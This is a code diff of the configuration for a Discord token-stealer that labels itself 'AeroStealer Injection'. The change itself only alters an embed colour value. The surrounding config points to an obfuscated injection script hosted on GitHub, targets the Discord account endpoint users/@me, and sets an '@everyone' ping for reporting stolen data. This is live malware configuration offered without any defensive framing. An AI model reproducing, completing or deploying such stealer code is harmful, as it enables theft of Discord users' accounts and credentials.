@@ -14,7 +14,7 @@ const config = {
   ping_val: '@everyone',
   embed_name: 'AeroStealer Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1234289355531620373/1247576135240388788/gif.gif?ex=66608751&is=665f35d1&hm=d33b16cc292696f95322ce7e6a86c671d49901687e4002c92f9e1f1de9139904&',
-  embed_color: 5639644, 
+  embed_color: 000000, 
   injection_url: 'https://raw.githubusercontent.com/HumanQueen/Discord-Injection-AS/main/injection-obfuscated.js',
 
   api: 'https://discord.com/api/v9/users/@me',
